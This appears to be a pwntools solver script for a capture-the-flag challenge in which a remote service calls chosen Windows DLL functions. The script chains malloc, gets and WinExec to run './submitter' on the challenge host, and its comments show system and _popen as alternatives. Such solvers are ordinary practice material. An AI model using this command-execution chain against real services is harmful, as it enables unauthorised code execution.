#!/usr/bin/env python3

from pwn import *
context.log_level = "CRITICAL"
import time

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

def function(module, funcname, arg):
    io.recvuntil(b"Which module would you like to load?")
    io.sendline(module)
    io.recvuntil(b"What function do you want to call?")
    io.sendline(funcname)
    io.recvuntil(b"What value do you want for the first argument?")
    io.sendline(str(arg).encode())


function(b"msvcrt.dll", b"malloc", 32)
io.recvuntil(b"Result:")
addr = int(io.recvline().rstrip(), 16)

function(b"msvcrt.dll", b"gets", addr)
# io.sendline(b"dir")
# io.sendline(b'echo "abc"')
io.sendline(b"./submitter")

function(b"msvcrt.dll", b"puts", addr)



function(b"kernel32.dll", b"WinExec", addr)
context.log_level = "DEBUG"

# function(b"msvcrt.dll", b"system", addr)


# _popenを使う方法は、第2引数modeを指定できずエラーになるのでだめそう
# function(b"msvcrt.dll", b"_popen", addr)
# io.recvuntil(b"Result:")
# fp = int(io.recvline().rstrip(), 16)
# for i in range(256):
#     function(b"msvcrt.dll", b"fgetc", fp)

time.sleep(1)
print(io.clean())
